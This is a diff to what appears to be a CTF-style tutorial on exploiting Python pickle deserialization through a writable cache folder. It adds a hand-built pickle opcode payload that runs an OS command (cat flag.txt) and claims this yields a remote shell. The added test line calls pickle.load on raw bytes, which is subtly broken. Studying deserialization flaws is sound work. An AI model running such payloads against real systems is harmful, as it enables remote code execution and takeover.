@@ -468,13 +468,18 @@ If in any way we have access to the cache folder, we can easily exploit it:
     with open("./cache/1.pkl", "wb") as f:
         f.write(payload)
 
-Or the general RCE exploit which only uses builtins.
+Or, since Pickle is a "programming language" which is executed by a VM, we can write a general RCE exploit which only uses builtins:
+
 .. code:: python
+    import pickle
+    
+    # Build the exploit
     command = b"""cat flag.txt"""
     x = b"c__builtin__\ngetattr\nc__builtin__\n__import__\nS'os'\n\x85RS'system'\n\x86RS'%s'\n\x85R."%command
     
+    # Test it
+    pickle.load(x)
     
-
 Next time that the function is called with argument ``1``, we will spawn a remote shell and take control of the system.
 
 
